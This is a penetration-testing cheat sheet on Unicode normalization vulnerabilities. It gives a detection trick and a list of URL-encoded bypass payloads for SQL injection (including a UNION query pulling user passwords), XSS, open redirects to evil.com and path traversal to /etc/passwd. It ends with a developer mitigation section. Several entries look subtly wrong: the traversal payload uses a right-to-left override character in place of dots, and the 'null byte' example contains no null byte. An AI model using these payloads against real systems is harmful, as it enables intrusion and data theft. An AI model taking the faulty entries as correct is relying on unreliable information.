## 1. Overview (Theory)

### What is Unicode Normalization?

Unicode normalization is a process that **standardizes different binary representations of characters** to the same binary value. This is critical in programming and data processing, but creates security vulnerabilities when systems normalize data at different stages of processing.

**Two Types of Character Equivalence:**

1. **Canonical Equivalence**: Characters that have identical appearance and meaning when displayed
2. **Compatibility Equivalence**: Characters representing the same abstract character but potentially displayed differently (weaker form)

### Four Normalization Algorithms

- **NFC** (Normalization Form Canonical Composition)
- **NFD** (Normalization Form Canonical Decomposition)
- **NFKC** (Normalization Form Compatibility Composition)
- **NFKD** (Normalization Form Compatibility Decomposition)

### Key Unicode Concepts

**Code Points & Encoding:**

- Each character receives a numerical value (code point)
- Code points are represented by 1+ bytes in memory
- **UTF-8**: ASCII uses 1 byte, others use up to 4 bytes
- **UTF-16**: Minimum 2 bytes, up to 4 bytes
- **UTF-32**: All characters use 4 bytes

**Example of Normalization:**

```python
unicodedata.normalize("NFKD","chloe\u0301") == unicodedata.normalize("NFKD", "chlo\u00e9")
```

### The Security Problem

**Vulnerability Pattern:**

1. Application filters/sanitizes user input
2. **After filtering**, Unicode normalization occurs
3. Normalized characters create previously filtered malicious payloads
4. Exploitation successful

---

## 2. Exploitation Methods

### Step 1: Discovery & Testing

**🎯 Detection Technique:**

Send the **KELVIN SIGN (U+0212A)** which normalizes to "K":

- URL-encoded: `%e2%84%aa`
- **If "K" is echoed back** → Unicode normalization is active

**Alternative Test:**

```
Input: %F0%9D%95%83%E2%85%87%F0%9D%99%A4%F0%9D%93%83%E2%85%88%F0%9D%94%B0%F0%9D%94%A5%F0%9D%99%96%F0%9D%93%83
Output after normalization: Leonishan
```

### Step 2: Identify Normalization Timing

**Critical Questions:**

- [ ] Does filtering happen BEFORE normalization?
- [ ] Is normalization applied to storage vs. display differently?
- [ ] Are regex validations using normalized vs. raw input?

### Step 3: Craft Exploitation Payloads

**Choose attack vector based on context:**

- SQL Injection bypass
- XSS filter evasion
- Regex/WAF bypass
- SSRF/Open Redirect manipulation

---

## 3. Bypasses

### SQL Injection Filter Bypass

**Scenario:** Application removes single quotes (`'`) but normalizes Unicode AFTER filtering.

**Attack Flow:**

```
1. Send: %ef%bc%87 (Unicode equivalent of ')
2. Filter removes standard ' characters ✓
3. Unicode normalization converts %ef%bc%87 → '
4. SQL injection payload executes ✗
```

**Visual Example:**

- Input: `admin%ef%bc%87 or 1=1-- -`
- After filter: `admin%ef%bc%87 or 1=1-- -` (passes)
- After normalization: `admin' or 1=1-- -` (SQLi payload)

### XSS Filter Bypass

**Characters that normalize to dangerous XSS characters:**

|Target|Unicode Alternative|URL-Encoded|Alt Format|
|---|---|---|---|
|`<`|≮ (U+226E)|`%e2%89%ae`|`%u226e`|
|`>`|≯ (U+226F)|`%e2%89%af`|`%u226f`|
|`"`|＂ (fullwidth)|`%ef%bc%82`|-|
|`'`|＇ (fullwidth)|`%ef%bc%87`|-|

**Example XSS Payload:**

```
%e2%89%aescript%e2%89%afalert(1)%e2%89%ae/script%e2%89%af
→ Normalizes to: <script>alert(1)</script>
```

### Regex/WAF Fuzzing Bypass

**Vulnerability Pattern:**

- Backend validates URL with regex on normalized input
- Backend makes request using NON-normalized input
- **Result:** SSRF or Open Redirect

**Tool:** [recollapse](https://github.com/0xacb/recollapse)

- Generates input variations for fuzzing
- Tests normalization inconsistencies
- Identifies regex bypass opportunities

### Unicode Overflow Bypass

**Technique:** Exploit byte value overflow (max 255) to produce unexpected ASCII characters.

**Characters that overflow to `A`:**

- `0x4e41`
- `0x4f41`
- `0x5041`
- `0x5141`

**Use Case:** Bypass character blocklists by crafting overflow sequences.

---

## 4. Payloads (Top 10 Modern & Robust)

### Unicode Character Reference Table

**Critical Characters:**

|Char|Unicode Hex|URL-Encoded|
|---|---|---|
|`o`|U+1D3C|`%e1%b4%bc`|
|`r`|U+1D3F|`%e1%b4%bf`|
|`1`|U+00B9|`%c2%b9`|
|`=`|U+207C|`%e2%81%bc`|
|`/`|U+FF0F|`%ef%bc%8f`|
|`-`|U+FE63|`%ef%b9%a3`|
|`#`|U+FE5F|`%ef%b9%9f`|
|`*`|U+FE61|`%ef%b9%a1`|
|`'`|U+FF07|`%ef%bc%87`|
|`"`|U+FF02|`%ef%bc%82`|
|`\|`|U+FF5C|`%ef%bd%9c`|

### SQL Injection Payloads

**1. Single Quote OR Attack:**

```
' or 1=1-- -
%ef%bc%87+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3
```

**2. Double Quote OR Attack:**

```
" or 1=1-- -
%ef%bc%82+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3
```

**3. Single Quote Pipe Attack:**

```
' || 1==1//
%ef%bc%87+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f
```

**4. Double Quote Pipe Attack:**

```
" || 1==1//
%ef%bc%82+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f
```

### XSS Payloads

**5. Basic Alert:**

```
<script>alert(1)</script>
%e2%89%aescript%e2%89%afalert(1)%e2%89%ae/script%e2%89%af
```

**6. IMG Tag XSS:**

```
<img src=x onerror=alert(1)>
%e2%89%aeimg src=x onerror=alert(1)%e2%89%af
```

### SSRF/Open Redirect Payloads

**7. Protocol Bypass:**

```
http://evil.com
ｈｔｔｐ://evil.com (fullwidth characters)
```

**8. Slash Normalization:**

```
https://trusted.com%ef%bc%8fevil.com
→ https://trusted.com/evil.com
```

### Path Traversal Payloads

**9. Directory Traversal:**

```
../../etc/passwd
%e2%80%ae%e2%80%ae%ef%bc%8f%e2%80%ae%e2%80%ae%ef%bc%8fetc/passwd
```

**10. Null Byte Injection:**

```
file.txt%00.jpg
file.txt%c0%af.jpg (overlong UTF-8 encoding of /)
```

### Automated Tool

**SQLMap Unicode Template:**

- Repository: [sqlmap_to_unicode_template](https://github.com/carlospolop/sqlmap_to_unicode_template)
- Automates Unicode-based SQLi testing
- Converts standard SQLMap payloads to Unicode equivalents

---

## 5. Higher Impact Scenarios

### Authentication Bypass

**Scenario:** Username normalization allows account takeover

- User registers: `Ａdmin` (fullwidth A)
- System normalizes to: `Admin`
- Attacker gains admin privileges

**Real-World:** Spotify creative usernames vulnerability

### File System Access

**Attack Chain:**

1. Upload filter blocks `../` sequences
2. Attacker uses Unicode: `%c0%af` (overlong UTF-8)
3. Normalization converts to `/`
4. Path traversal achieved: `%c0%ae%c0%ae%c0%afetc%c0%afpasswd`

### Data Exfiltration via SQLi

**Advanced Technique:**

```sql
' UNION SELECT password FROM users-- -
```

**Unicode Version:**

```
%ef%bc%87+UNION+SELECT+password+FROM+users%ef%b9%a3%ef%b9%a3+%ef%b9%a3
```

### Multi-Stage Attacks

**Exploitation Flow:**

1. **Stage 1:** Bypass WAF with Unicode
2. **Stage 2:** Exploit SQL injection
3. **Stage 3:** Extract database credentials
4. **Stage 4:** Pivot to internal systems via SSRF
5. **Stage 5:** Achieve RCE through stored XSS in admin panel

---

## 6. Mitigations

### For Developers

**🛡️ Defense Strategy:**

**1. Normalize Early & Consistently**

```python
# BAD: Filter then normalize
user_input = remove_quotes(user_input)
user_input = normalize_unicode(user_input)  # Too late!

# GOOD: Normalize then filter
user_input = normalize_unicode(user_input)
user_input = remove_quotes(user_input)
```

**2. Use Allowlists Over Blocklists**

```python
# Define acceptable characters explicitly
ALLOWED_CHARS = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
user_input = ''.join(c for c in user_input if c in ALLOWED_CHARS)
```

**3. Validate After Every Transformation**

```python
def secure_processing(user_input):
    # Step 1: Normalize
    normalized = unicodedata.normalize('NFKC', user_input)
    
    # Step 2: Validate
    if not is_safe(normalized):
        raise SecurityException()
    
    # Step 3: Sanitize
    sanitized = escape_dangerous_chars(normalized)
    
    # Step 4: Validate again
    if not is_safe(sanitized):
        raise SecurityException()
    
    return sanitized
```

**4. Implement Context-Aware Encoding**

- SQL context → Use parameterized queries
- HTML context → Use HTML entity encoding
- JavaScript context → Use JavaScript escaping
- URL context → Use URL encoding

**5. Security Testing Checklist**

- [ ] Test with Unicode normalization table
- [ ] Verify filter ordering
- [ ] Check all encoding/decoding points
- [ ] Validate regex boundary conditions
- [ ] Test overflow scenarios

### For Security Teams

**🎯 Testing Methodology:**

**Phase 1: Reconnaissance**

- Identify all user input points
- Map data transformation flows
- Document encoding/normalization stages

**Phase 2: Vulnerability Assessment**

- Test KELVIN SIGN detection method
- Fuzz with recollapse tool
- Attempt bypass payloads from section 4

**Phase 3: Impact Analysis**

- Determine exploitability
- Assess data exposure risk
- Evaluate privilege escalation potential

**Phase 4: Remediation Validation**

- Verify fix implementation
- Retest with original payloads
- Perform regression testing

---

## Additional Resources

**Unicode Normalization Tables:**

- [AppCheck Unicode Table](https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html)
- [0xacb Normalization Table](https://0xacb.com/normalization_table)

**Research & Tools:**

- [Recollapse Fuzzer](https://github.com/0xacb/recollapse)
- [SQLMap Unicode Template](https://github.com/carlospolop/sqlmap_to_unicode_template)
- [PortSwigger Unicode Research](https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows)

**Case Studies:**

- [Spotify Creative Usernames](https://labs.spotify.com/2013/06/18/creative-usernames/)
- [Directory Traversal with Unicode](https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work)
- [WAF Bypass via Unicode](https://jlajara.gitlab.io/posts/2020/02/19/Bypass_WAF_Unicode.html)

---

**💡 Pro Tip:** Unicode normalization vulnerabilities are often overlooked in security assessments. Master these techniques and you'll discover vulnerabilities others miss. Stay persistent, test systematically, and document everything! 🚀